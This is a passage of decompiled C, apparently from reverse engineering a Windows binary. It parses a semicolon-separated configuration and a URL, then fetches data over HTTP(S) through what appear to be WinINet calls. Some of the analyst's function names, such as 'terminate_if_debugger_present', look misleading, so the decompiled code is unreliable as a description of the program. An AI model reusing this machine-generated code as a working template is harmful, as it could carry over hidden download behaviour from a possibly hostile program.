  int iVar5;
  undefined4 unaff_ESI;
  undefined uVar6;
  uint uStack125028;
  char *pcStack125020;
  undefined4 uStack125016;
  undefined auStack125012 [50000];
  char acStack75012 [50000];
  undefined local_61b4 [15000];
  undefined local_271c [5000];
  char local_1394 [5004];
  uint local_8;
  
  piVar2 = DAT_003d92ec;
  uVar1 = DAT_003d92d8;
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uStack125016 = 0;
  trim_string((undefined (*) [16])acStack75012,0,50000);
  trim_string((undefined (*) [16])local_271c,0,5000);
  trim_string((undefined (*) [16])local_1394,0,5000);
  trim_string((undefined (*) [16])auStack125012,0,50000);
  trim_string((undefined (*) [16])local_61b4,0,15000);
  (*_DAT_003d9520)(acStack75012,uVar1);
  pcVar3 = _strtok_s(acStack75012,";",&pcStack125020);
  uVar6 = (undefined)unaff_ESI;
  iVar5 = 1;
  while (pcVar3 != (char *)0x0) {
    switch(iVar5) {
    case 1:
      trim_string((undefined (*) [16])local_271c,0,5000);
      (*_DAT_003d9520)(local_271c,pcVar3);
      break;
    case 2:
      trim_string((undefined (*) [16])local_1394,0,5000);
      (*_DAT_003d9520)(local_1394,pcVar3);
      break;
    case 3:
      trim_string((undefined (*) [16])auStack125012,0,50000);
      (*_DAT_003d9520)(auStack125012,pcVar3);
      break;
    case 4:
      uStack125028 = FUN_003b1703(pcVar3);
      break;
    case 5:
      iVar4 = (*_DAT_003d9550)(pcVar3,&DAT_003d096c);
      if (iVar4 == 0) {
        pcStack125020 = (char *)0x1;
        uStack125016 = 999;
      }
      else {
        iVar4 = (*_DAT_003d9550)(pcVar3,"false");
        if (iVar4 == 0) {
          pcStack125020 = (char *)0x0;
        }
        else {
          pcStack125020 = (char *)0x1;
          uStack125016 = FUN_003b1703(pcVar3);
        }
      }
      break;
    case 6:
      trim_string((undefined (*) [16])local_61b4,0,15000);
      (*_DAT_003d9520)(local_61b4,pcVar3);
      FUN_00390be0(auStack125012,pcVar3,local_271c,uStack125028,local_1394,(int)pcStack125020,piVar2
                  );
      iVar5 = 0;
    }
    iVar5 = iVar5 + 1;
    pcVar3 = _strtok_s((char *)0x0,";",&pcStack125020);
    uVar6 = (undefined)unaff_ESI;
  }
  trim_string((undefined (*) [16])acStack75012,0,50000);
  terminate_if_debugger_present(local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar6);
  return;
}



undefined * __cdecl FUN_00391900(undefined *param_1)

{
  int *piVar1;
  int **in_EAX;
  size_t sVar2;
  int iVar3;
  int iVar4;
  int **ppiVar5;
  int **local_8;
  
  sVar2 = _strlen(" \n\r\t");
  iVar3 = FUN_00395aa0(sVar2);
  _strlen(" \n\r\t");
  iVar4 = FUN_00395b10();
  piVar1 = in_EAX[5];
  if (iVar3 == -1) {
    ppiVar5 = in_EAX;
    if ((int *)0xf < piVar1) {
      ppiVar5 = (int **)*in_EAX;
    }
  }
  else {
    ppiVar5 = in_EAX;
    if ((int *)0xf < piVar1) {
      ppiVar5 = (int **)*in_EAX;
    }
    ppiVar5 = (int **)((int)ppiVar5 + iVar3);
  }
  if (iVar4 == -1) {
    if (piVar1 < (int *)0x10) {
      local_8 = (int **)((int)in_EAX[4] + (int)in_EAX);
    }
    else {
      local_8 = (int **)((int)in_EAX[4] + (int)*in_EAX);
    }
  }
  else {
    if ((int *)0xf < piVar1) {
      in_EAX = (int **)*in_EAX;
    }
    local_8 = (int **)((int)in_EAX + iVar4 + 1);
  }
  *(undefined4 *)(param_1 + 0x14) = 0xf;
  *(undefined4 *)(param_1 + 0x10) = 0;
  *param_1 = 0;
  if (ppiVar5 != local_8) {
    FUN_003894c0(param_1,ppiVar5,(int *)((int)local_8 - (int)ppiVar5));
  }
  return param_1;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_003919d0(undefined *param_1,undefined4 *param_2)

{
  int *piVar1;
  size_t sVar2;
  int iVar3;
  uint uVar4;
  undefined4 **ppuVar5;
  undefined4 *puVar6;
  undefined4 uVar7;
  undefined4 ****ppppuVar8;
  int ****ppppiVar9;
  int iVar10;
  undefined *puVar11;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined4 extraout_EDX_06;
  undefined4 extraout_EDX_07;
  undefined4 extraout_EDX_08;
  undefined4 extraout_EDX_09;
  uint uVar12;
  int **in_FS_OFFSET;
  undefined4 in_stack_00000018;
  uint in_stack_0000001c;
  int in_stack_00000024;
  undefined4 *in_stack_00000028;
  uint in_stack_0000003c;
  undefined uVar13;
  undefined4 uVar14;
  undefined4 local_9fc;
  undefined *local_9f8;
  int *local_9f4;
  int *local_9f0;
  char local_9ec [4];
  int local_9e8;
  uint local_9e4;
  void *local_9e0 [4];
  undefined4 local_9d0;
  uint local_9cc;
  undefined4 ****local_9c4 [4];
  undefined4 local_9b4;
  uint local_9b0;
  void *local_9a8 [4];
  undefined4 local_998;
  uint local_994;
  undefined4 ****local_98c [4];
  undefined4 local_97c;
  uint local_978;
  int ****local_970 [4];
  int *local_960;
  uint local_95c;
  int ****local_954 [4];
  undefined4 local_944;
  uint local_940;
  int ****local_938 [4];
  uint local_928;
  uint local_924;
  void *local_91c [4];
  undefined4 local_90c;
  uint local_908;
  int *local_900 [4];
  undefined4 local_8f0;
  uint local_8ec;
  undefined local_8e4 [2000];
  char local_114 [256];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3925;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_9f8 = param_1;
  local_9e4 = 0;
  local_8 = 1;
  local_994 = 0xf;
  local_998 = 0;
  local_9a8[0] = (void *)((uint)local_9a8[0] & 0xffffff00);
  piVar1 = (int *)_strlen("");
  FUN_003894c0(local_9a8,(int **)&DAT_003ce656,piVar1);
  local_940 = 0xf;
  local_944 = 0;
  local_954[0] = (int ****)((uint)local_954[0] & 0xffffff00);
  local_95c = 0xf;
  local_960 = (int *)0x0;
  local_970[0] = (int ****)((uint)local_970[0] & 0xffffff00);
  local_924 = 0xf;
  local_928 = 0;
  local_938[0] = (int ****)((uint)local_938[0] & 0xffffff00);
  local_978 = 0xf;
  local_97c = 0;
  local_98c[0] = (undefined4 ****)((uint)local_98c[0] & 0xffffff00);
  local_9b0 = 0xf;
  local_9b4 = 0;
  local_9c4[0] = (undefined4 ****)((uint)local_9c4[0] & 0xffffff00);
  local_9cc = 0xf;
  local_9d0 = 0;
  local_9e0[0] = (void *)((uint)local_9e0[0] & 0xffffff00);
  local_8._0_1_ = 8;
  local_9e8 = 0;
  FUN_00391900((undefined *)local_91c);
  local_8._0_1_ = 9;
  FUN_003893d0();
  local_8 = CONCAT31(local_8._1_3_,8);
  if (0xf < local_908) {
    FUN_003aee4b(local_91c[0]);
  }
  sVar2 = _strlen("https://");
  uVar12 = 8;
  if (local_928 < 8) {
    uVar12 = local_928;
  }
  uVar4 = uVar12;
  if (sVar2 <= uVar12) {
    uVar4 = sVar2;
  }
  ppppiVar9 = local_938[0];
  if (local_924 < 0x10) {
    ppppiVar9 = (int ****)local_938;
  }
  iVar3 = _memcmp(ppppiVar9,"https://",uVar4);
  if (((iVar3 == 0) && (sVar2 <= uVar12)) && (uVar12 == sVar2)) {
    local_9e8 = 8;
  }
  else {
    sVar2 = _strlen("http://");
    uVar12 = 7;
    if (local_928 < 7) {
      uVar12 = local_928;
    }
    uVar4 = uVar12;
    if (sVar2 <= uVar12) {
      uVar4 = sVar2;
    }
    ppppiVar9 = local_938[0];
    if (local_924 < 0x10) {
      ppppiVar9 = (int ****)local_938;
    }
    iVar3 = _memcmp(ppppiVar9,"http://",uVar4);
    if (((iVar3 == 0) && (sVar2 <= uVar12)) && (uVar12 == sVar2)) {
      local_9e8 = 7;
    }
  }
  local_9ec[0] = '/';
  local_9f4 = (int *)FUN_003959f0(local_938,local_9ec,1);
  if (local_9f4 == (int *)0xffffffff) {
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
    piVar1 = (int *)_strlen("");
    FUN_003894c0(local_900,(int **)&DAT_003ce656,piVar1);
    local_8 = CONCAT31(local_8._1_3_,10);
    uVar12 = 1;
  }
  else {
    FUN_00395990(local_9f4,(int **)local_938,(int *)0xffffffff);
    local_8 = 0xb;
    uVar12 = 2;
  }
  local_9e4 = uVar12;
  FUN_003893d0();
  if ((uVar12 & 2) != 0) {
    uVar12 = uVar12 & 0xfffffffd;
    local_9e4 = uVar12;
    if (0xf < local_908) {
      FUN_003aee4b(local_91c[0]);
    }
    local_908 = 0xf;
    local_90c = 0;
    local_91c[0] = (void *)((uint)local_91c[0] & 0xffffff00);
  }
  local_8 = 8;
  if (((uVar12 & 1) != 0) && (uVar12 = uVar12 & 0xfffffffe, local_9e4 = uVar12, 0xf < local_8ec)) {
    FUN_003aee4b(local_900[0]);
  }
  if (local_9f4 == (int *)0xffffffff) {
    ppppiVar9 = local_938[0];
    if (local_924 < 0x10) {
      ppppiVar9 = (int ****)local_938;
    }
    puVar11 = (undefined *)((int)ppppiVar9 + local_928);
  }
  else {
    ppppiVar9 = local_938[0];
    if (local_924 < 0x10) {
      ppppiVar9 = (int ****)local_938;
    }
    puVar11 = (undefined *)((int)ppppiVar9 + (int)local_9f4);
  }
  ppppiVar9 = local_938[0];
  if (local_924 < 0x10) {
    ppppiVar9 = (int ****)local_938;
  }
  local_8ec = 0xf;
  local_8f0 = 0;
  local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
  FUN_00395eb0(local_900,(undefined *)((int)ppppiVar9 + local_9e8),puVar11);
  local_8._0_1_ = 0xc;
  FUN_003893d0();
  local_8._0_1_ = 8;
  if (0xf < local_8ec) {
    FUN_003aee4b(local_900[0]);
  }
  sVar2 = _strlen("#");
  piVar1 = (int *)FUN_003959f0(local_954,"#",sVar2);
  if (piVar1 == (int *)0xffffffff) {
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
    FUN_003896c0(local_900,(int **)local_954,(int *)0x0,(int *)0xffffffff);
    local_8 = 0xe;
    uVar12 = uVar12 | 8;
  }
  else {
    FUN_00395990((int *)0x0,(int **)local_954,piVar1);
    local_8 = CONCAT31(local_8._1_3_,0xd);
    uVar12 = uVar12 | 4;
  }
  local_9e4 = uVar12;
  FUN_003893d0();
  if ((uVar12 & 8) != 0) {
    uVar12 = uVar12 & 0xfffffff7;
    local_9e4 = uVar12;
    if (0xf < local_8ec) {
      FUN_003aee4b(local_900[0]);
    }
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
  }
  local_8 = 8;
  if (((uVar12 & 4) != 0) && (uVar12 = uVar12 & 0xfffffffb, local_9e4 = uVar12, 0xf < local_908)) {
    FUN_003aee4b(local_91c[0]);
  }
  sVar2 = _strlen(":");
  local_9f0 = (int *)FUN_003959f0(local_970,":",sVar2);
  if (local_9f0 == (int *)0xffffffff) {
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
    piVar1 = (int *)_strlen("");
    FUN_003894c0(local_900,(int **)&DAT_003ce656,piVar1);
    local_8 = 0x10;
    uVar12 = uVar12 | 0x20;
  }
  else {
    FUN_00395990((int *)((int)local_9f0 + 1),(int **)local_970,(int *)0xffffffff);
    local_8 = CONCAT31(local_8._1_3_,0xf);
    uVar12 = uVar12 | 0x10;
  }
  local_9e4 = uVar12;
  FUN_003893d0();
  if ((uVar12 & 0x20) != 0) {
    uVar12 = uVar12 & 0xffffffdf;
    local_9e4 = uVar12;
    if (0xf < local_8ec) {
      FUN_003aee4b(local_900[0]);
    }
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
  }
  local_8 = 8;
  if (((uVar12 & 0x10) != 0) && (uVar12 = uVar12 & 0xffffffef, local_9e4 = uVar12, 0xf < local_908))
  {
    FUN_003aee4b(local_91c[0]);
  }
  piVar1 = local_9f0;
  if (local_9f0 == (int *)0xffffffff) {
    piVar1 = local_960;
  }
  FUN_00395990((int *)0x0,(int **)local_970,piVar1);
  local_8._0_1_ = 0x11;
  FUN_003893d0();
  local_8._0_1_ = 8;
  if (0xf < local_908) {
    FUN_003aee4b(local_91c[0]);
  }
  if (local_9e8 < 1) {
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
    piVar1 = (int *)_strlen("");
    FUN_003894c0(local_900,(int **)&DAT_003ce656,piVar1);
    local_8 = 0x13;
    uVar12 = uVar12 | 0x80;
  }
  else {
    FUN_00395990((int *)0x0,(int **)local_938,(int *)(local_9e8 + -3));
    local_8 = CONCAT31(local_8._1_3_,0x12);
    uVar12 = uVar12 | 0x40;
  }
  local_9e4 = uVar12;
  FUN_003893d0();
  if ((char)uVar12 < '\0') {
    uVar12 = uVar12 & 0xffffff7f;
    local_9e4 = uVar12;
    if (0xf < local_8ec) {
      FUN_003aee4b(local_900[0]);
    }
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
  }
  local_8 = 8;
  if (((uVar12 & 0x40) != 0) && (uVar12 = uVar12 & 0xffffffbf, local_9e4 = uVar12, 0xf < local_908))
  {
    FUN_003aee4b(local_91c[0]);
  }
  sVar2 = _strlen("?");
  local_9f0 = (int *)FUN_003959f0(local_954,"?",sVar2);
  if (local_9f0 == (int *)0xffffffff) {
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
    piVar1 = (int *)_strlen("");
    FUN_003894c0(local_900,(int **)&DAT_003ce656,piVar1);
    local_8 = 0x15;
    uVar12 = uVar12 | 0x200;
  }
  else {
    FUN_00395990((int *)((int)local_9f0 + 1),(int **)local_954,(int *)0xffffffff);
    local_8 = CONCAT31(local_8._1_3_,0x14);
    uVar12 = uVar12 | 0x100;
  }
  local_9e4 = uVar12;
  FUN_003893d0();
  if ((uVar12 & 0x200) != 0) {
    uVar12 = uVar12 & 0xfffffdff;
    local_9e4 = uVar12;
    if (0xf < local_8ec) {
      FUN_003aee4b(local_900[0]);
    }
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
  }
  local_8 = 8;
  if (((uVar12 & 0x100) != 0) && (uVar12 = uVar12 & 0xfffffeff, local_9e4 = uVar12, 0xf < local_908)
     ) {
    FUN_003aee4b(local_91c[0]);
  }
  if (local_9f0 == (int *)0xffffffff) {
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
    FUN_003896c0(local_900,(int **)local_954,(int *)0x0,(int *)0xffffffff);
    local_8 = 0x17;
    uVar12 = uVar12 | 0x800;
  }
  else {
    FUN_00395990((int *)0x0,(int **)local_954,local_9f0);
    local_8 = CONCAT31(local_8._1_3_,0x16);
    uVar12 = uVar12 | 0x400;
  }
  local_9e4 = uVar12;
  FUN_003893d0();
  if ((uVar12 & 0x800) != 0) {
    uVar12 = uVar12 & 0xfffff7ff;
    if (0xf < local_8ec) {
      FUN_003aee4b(local_900[0]);
    }
    local_8ec = 0xf;
    local_8f0 = 0;
    local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
  }
  local_8 = 8;
  if ((uVar12 & 0x400) != 0) {
    if (0xf < local_908) {
      FUN_003aee4b(local_91c[0]);
    }
    local_908 = 0xf;
    local_90c = 0;
    local_91c[0] = (void *)((uint)local_91c[0] & 0xffffff00);
  }
  ppppiVar9 = local_970[0];
  if (local_95c < 0x10) {
    ppppiVar9 = (int ****)local_970;
  }
  (*_DAT_003d943c)(ppppiVar9);
  ppuVar5 = (undefined4 **)param_2;
  if (in_stack_0000001c < 0x10) {
    ppuVar5 = &param_2;
  }
  (*_DAT_003d943c)(ppuVar5);
  if (in_stack_00000024 == 0) {
    puVar6 = in_stack_00000028;
    if (in_stack_0000003c < 0x10) {
      puVar6 = (undefined4 *)&stack0x00000028;
    }
    uVar14 = 0;
    local_9e8 = (*_DAT_003d945c)(puVar6,0,0,0,0);
  }
  else {
    puVar6 = (undefined4 *)FUN_003a4b80(local_91c);
    local_8._0_1_ = 0x18;
    if (0xf < (uint)puVar6[5]) {
      puVar6 = (undefined4 *)*puVar6;
    }
    uVar14 = 0;
    local_9e8 = (*_DAT_003d945c)(puVar6,0,0,0,0);
    local_8 = CONCAT31(local_8._1_3_,8);
    if (0xf < local_908) {
      FUN_003aee4b(local_91c[0]);
    }
    local_908 = 0xf;
    local_90c = 0;
    local_91c[0] = (void *)((uint)local_91c[0] & 0xffffff00);
  }
  ppppuVar8 = local_9c4[0];
  if (local_9b0 < 0x10) {
    ppppuVar8 = local_9c4;
  }
  uVar7 = FUN_003b1703((char *)ppppuVar8);
  ppppuVar8 = local_98c[0];
  if (local_978 < 0x10) {
    ppppuVar8 = local_98c;
  }
  iVar3 = (*_DAT_003d9550)(ppppuVar8,"https");
  uVar13 = (undefined)uVar14;
  iVar3 = (-(uint)(iVar3 != 0) & 0xff800000) + 0x4800000;
  if (local_9e8 != 0) {
    ppppiVar9 = local_970[0];
    if (local_95c < 0x10) {
      ppppiVar9 = (int ****)local_970;
    }
    local_9f0 = (int *)(*_DAT_003d9578)(local_9e8,ppppiVar9,uVar7,0,0,3,iVar3,0);
    uVar13 = (undefined)uVar14;
    if (local_9f0 != (int *)0x0) {
      ppppiVar9 = local_954[0];
      if (local_940 < 0x10) {
        ppppiVar9 = (int ****)local_954;
      }
      uVar12 = (*_DAT_003d95bc)(local_9f0,&DAT_003d0c18,ppppiVar9,0,0,0,iVar3,0);
      uVar13 = (undefined)uVar14;
      local_9e4 = uVar12;
      if (uVar12 != 0) {
        iVar3 = (*_DAT_003d953c)(uVar12,0,0,0,0);
        local_9fc = 0x100;
        iVar10 = (*_DAT_003d95d4)(uVar12,0x13,local_114,&local_9fc,0);
        uVar13 = (undefined)uVar14;
        if (iVar10 != 0) {
          iVar10 = FUN_003b1703(local_114);
          uVar13 = (undefined)uVar14;
          if (iVar10 == 200) {
            if (iVar3 != 0) {
              iVar3 = (*_DAT_003d9480)(uVar12,local_8e4,1999,&local_9f4);
              while ((uVar13 = (undefined)uVar14, iVar3 != 0 && (local_9f4 != (int *)0x0))) {
                local_8e4[(int)local_9f4] = 0;
                FUN_00395c10(local_900,local_9a8);
                local_8._0_1_ = 0x19;
                FUN_003893d0();
                local_8 = CONCAT31(local_8._1_3_,8);
                if (0xf < local_8ec) {
                  FUN_003aee4b(local_900[0]);
                }
                local_8f0 = 0;
                local_900[0] = (int *)((uint)local_900[0] & 0xffffff00);
                local_8ec = 0xf;
                iVar3 = (*_DAT_003d9480)(local_9e4,local_8e4,1999,&local_9f4);
                uVar12 = local_9e4;
              }
            }
            (*_DAT_003d9458)(uVar12);
            goto LAB_0039265c;
          }
        }
        FUN_00389300(local_9f8,(int **)"ERROR");
        FUN_00389360(local_9e0);
        FUN_00389360(local_9c4);
        FUN_00389360(local_98c);
        FUN_00389360(local_938);
        FUN_00389360(local_970);
        FUN_00389360(local_954);
        FUN_00389360(local_9a8);
        FUN_00389360(&param_2);
        FUN_00389360((void **)&stack0x00000028);
        uVar14 = extraout_EDX;
        goto LAB_003927ef;
      }
LAB_0039265c:
      (*_DAT_003d9458)(local_9f0);
    }
    (*_DAT_003d9458)(local_9e8);
  }
  *(undefined4 *)(local_9f8 + 0x14) = 0xf;
  *(undefined4 *)(local_9f8 + 0x10) = 0;
  *local_9f8 = 0;
  FUN_003893d0();
  uVar14 = extraout_EDX_00;
  if (0xf < local_9cc) {
    FUN_003aee4b(local_9e0[0]);
    uVar14 = extraout_EDX_01;
  }
  local_9cc = 0xf;
  local_9d0 = 0;
  local_9e0[0] = (void *)((uint)local_9e0[0] & 0xffffff00);
  if (0xf < local_9b0) {
    FUN_003aee4b(local_9c4[0]);
    uVar14 = extraout_EDX_02;
  }
  local_9b0 = 0xf;
  local_9b4 = 0;
  local_9c4[0] = (undefined4 ****)((uint)local_9c4[0] & 0xffffff00);
  if (0xf < local_978) {
    FUN_003aee4b(local_98c[0]);
    uVar14 = extraout_EDX_03;
  }
  local_978 = 0xf;
  local_97c = 0;
  local_98c[0] = (undefined4 ****)((uint)local_98c[0] & 0xffffff00);
  if (0xf < local_924) {
    FUN_003aee4b(local_938[0]);
    uVar14 = extraout_EDX_04;
  }
  local_924 = 0xf;
  local_928 = 0;
  local_938[0] = (int ****)((uint)local_938[0] & 0xffffff00);
  if (0xf < local_95c) {
    FUN_003aee4b(local_970[0]);
    uVar14 = extraout_EDX_05;
  }
  local_95c = 0xf;
  local_960 = (int *)0x0;
  local_970[0] = (int ****)((uint)local_970[0] & 0xffffff00);
  if (0xf < local_940) {
    FUN_003aee4b(local_954[0]);
    uVar14 = extraout_EDX_06;
  }
  local_940 = 0xf;
  local_944 = 0;
  local_954[0] = (int ****)((uint)local_954[0] & 0xffffff00);
  if (0xf < local_994) {
    FUN_003aee4b(local_9a8[0]);
    uVar14 = extraout_EDX_07;
  }
  local_994 = 0xf;
  local_998 = 0;
  local_9a8[0] = (void *)((uint)local_9a8[0] & 0xffffff00);
  if (0xf < in_stack_0000001c) {
    FUN_003aee4b(param_2);
    uVar14 = extraout_EDX_08;
  }
  in_stack_0000001c = 0xf;
  in_stack_00000018 = 0;
  param_2 = (undefined4 *)((uint)param_2 & 0xffffff00);
  if (0xf < in_stack_0000003c) {
    FUN_003aee4b(in_stack_00000028);
    uVar14 = extraout_EDX_09;
  }
LAB_003927ef:
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar14,uVar13);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00392810(int param_1,undefined4 *param_2)

{
  int *piVar1;
  int iVar2;
  undefined4 **ppuVar3;
  uint uVar4;
  undefined4 ****ppppuVar5;
  char *_Str;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar6;
  undefined uVar7;
  int **in_FS_OFFSET;
  uint in_stack_00000018;
  uint in_stack_0000001c;
  int *in_stack_00000024;
  uint in_stack_00000038;
  char *in_stack_00000040;
  uint in_stack_ffffff54;
  undefined4 *puVar8;
  undefined local_8c [8];
  undefined4 uStack132;
  char *local_54;
  int **local_50;
  void *local_4c [4];
  undefined4 local_3c;
  uint local_38;
  undefined4 ****local_30 [4];
  undefined4 local_20;
  uint local_1c;
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3c28;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = (undefined4 ****)((uint)local_30[0] & 0xffffff00);
  local_8._0_1_ = 2;
  local_8._1_3_ = 0;
  local_54 = (char *)0x0;
  local_50 = (int **)0x0;
  local_8c[0] = 0;
  piVar1 = (int *)_strlen("");
  FUN_003894c0(local_8c,(int **)&DAT_003ce656,piVar1);
  uVar7 = 0x54;
  local_8._0_1_ = 3;
  puVar8 = (undefined4 *)(in_stack_ffffff54 & 0xffffff00);
  FUN_003896c0(&stack0xffffff54,(int **)&stack0x00000024,(int *)0x0,(int *)0xffffffff);
  local_8._0_1_ = 2;
  FUN_003919d0((undefined *)local_4c,puVar8);
  local_8._0_1_ = 4;
  FUN_003893d0();
  local_8 = CONCAT31(local_8._1_3_,2);
  if (0xf < local_38) {
    FUN_003aee4b(local_4c[0]);
  }
  local_38 = 0xf;
  local_3c = 0;
  local_4c[0] = (void *)((uint)local_4c[0] & 0xffffff00);
  iVar2 = (*_DAT_003d9550)();
  if (iVar2 != 0) {
    ppuVar3 = (undefined4 **)param_2;
    if (in_stack_0000001c < 0x10) {
      ppuVar3 = &param_2;
    }
    uStack132 = 0x392925;
    uVar4 = FUN_003959f0(local_30,(char *)ppuVar3,in_stack_00000018);
    _Str = (char *)local_50;
    if (uVar4 != 0xffffffff) {
      FUN_003898c0(local_30,(int *)0x0,uVar4 + param_1);
      ppppuVar5 = local_30[0];
      if (local_1c < 0x10) {
        ppppuVar5 = local_30;
      }
      uStack132 = 0x392950;
      _Str = _strtok_s((char *)ppppuVar5,in_stack_00000040,&local_54);
    }
    iVar2 = (*_DAT_003d9418)();
    if (0 < iVar2) {
      piVar1 = (int *)_strlen(_Str);
      goto LAB_00392986;
    }
  }
  piVar1 = (int *)_strlen("ERROR");
  _Str = "ERROR";
LAB_00392986:
  FUN_003894c0(&DAT_003d72cc,(int **)_Str,piVar1);
  local_20 = 0;
  ppppuVar5 = local_30[0];
  if (local_1c < 0x10) {
    ppppuVar5 = local_30;
  }
  *(char *)ppppuVar5 = '\0';
  uVar6 = extraout_EDX;
  if (0xf < local_1c) {
    FUN_003aee4b(local_30[0]);
    uVar6 = extraout_EDX_00;
  }
  local_1c = 0xf;
  local_20 = 0;
  local_30[0] = (undefined4 ****)((uint)local_30[0] & 0xffffff00);
  if (0xf < in_stack_0000001c) {
    FUN_003aee4b(param_2);
    uVar6 = extraout_EDX_01;
  }
  in_stack_0000001c = 0xf;
  in_stack_00000018 = 0;
  param_2 = (undefined4 *)((uint)param_2 & 0xffffff00);
  if (0xf < in_stack_00000038) {
    FUN_003aee4b(in_stack_00000024);
    uVar6 = extraout_EDX_02;
  }
  *in_FS_OFFSET = local_10;
  terminate_if_debugger_present(local_14 ^ (uint)&stack0xfffffffc,uVar6,uVar7);
  return;
}



// WARNING: Could not reconcile some variable overlaps
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00392a10(int *param_1)

{
  int iVar1;
  int *piVar2;
  undefined4 ****ppppuVar3;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 uVar4;
  int **ppiVar5;
  int **in_FS_OFFSET;
  undefined4 uStack00000014;
  uint in_stack_00000018;
  void *in_stack_00000020;
  undefined4 uStack00000030;
  uint in_stack_00000034;
  int *in_stack_0000003c;
  uint in_stack_00000050;
  undefined4 *in_stack_fffffec8;
  undefined auStack280 [4];
  undefined4 uStack276;
  undefined uVar6;
  undefined4 local_d0;
  undefined *local_cc;
  undefined4 local_c8;
  undefined *local_94;
  undefined *local_90;
  void *local_8c [4];
  undefined4 local_7c;
  uint local_78;
  undefined4 ****local_70 [4];
  undefined4 local_60;
  uint local_5c;
  undefined local_54 [64];
  uint local_14;
  int *local_10;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &LAB_003c3bd6;
  local_10 = *in_FS_OFFSET;
  local_14 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  *in_FS_OFFSET = (int *)&local_10;
  local_5c = 0xf;
  local_60 = 0;
  local_70[0] = (undefined4 ****)((uint)local_70[0] & 0xffffff00);
  local_8._0_1_ = 3;
  local_8._1_3_ = 0;
  ppiVar5 = (int **)param_1;
  if (in_stack_00000018 < 0x10) {
    ppiVar5 = &param_1;
  }
  uVar6 = SUB41(ppiVar5,0);
  trim_string((undefined (*) [16])local_54,0,0x40);
  trim_string((undefined (*) [16])&local_d0,0,0x3c);
  local_cc = local_54;
  local_d0 = 0x3c;
  local_c8 = 0x40;
  (*_DAT_003d9418)();
  (*_DAT_003d93fc)();
  (*_DAT_003d9550)();
  local_94 = auStack280;
  auStack280[0] = 0;
  FUN_003896c0(auStack280,(int **)&stack0x0000003c,(int *)0x0,(int *)0xffffffff);
  local_90 = &stack0xfffffec8;
  local_8._0_1_ = 4;
  FUN_00395cd0((undefined4 *)&stack0xfffffec8,&param_1,(undefined4 *)&stack0x00000020);
  local_8._0_1_ = 3;
  FUN_003919d0((undefined *)local_8c,in_stack_fffffec8);
  local_8._0_1_ = 5;
  FUN_003893d0();
  local_8 = CONCAT31(local_8._1_3_,3);
  if (0xf < local_78) {
    FUN_003aee4b(local_8c[0]);
  }
  local_78 = 0xf;
  local_7c = 0;
  local_8c[0] = (void *)((uint)local_8c[0] & 0xffffff00);
  iVar1 = (*_DAT_003d9550)();
  if (iVar1 == 0) {
    piVar2 = (int *)_strlen("ERROR");
    FUN_003894c0(&DAT_003d72cc,(int **)"ERROR",piVar2);
    uVar4 = extraout_EDX_00;
  }
  else {
    uStack276 = 0x392b8d;
    FUN_003896c0(&DAT_003d72cc,&param_1,(int *)0x0,(int *)0xffffffff);
    ppppuVar3 = local_70[0];
    if (local_5c < 0x10) {
      ppppuVar3 = local_70;
    }
    FUN_0038f000(ppppuVar3);
    uVar4 = extraout_EDX;
  }
  local_60 = 0;
  ppppuVar3 = local_70[0];
  if (local_5c < 0x10) {
    ppppuVar3 = local_70;
  }
  *(undefined *)ppppuVar3 = 0;
  if (0xf < local_5c) {
    FUN_003aee4b(local_70[0]);
    uVar4 = extraout_EDX_01;
  }
  local_5c = 0xf;
  local_60 = 0;
  local_70[0] = (undefined4 ****)((uint)local_70[0] & 0xffffff00);
  if (0xf < in_stack_00000018) {
    FUN_003aee4b(param_1);
    uVar4 = extraout_EDX_02;
  }
  in_stack_00000018 = 0xf;
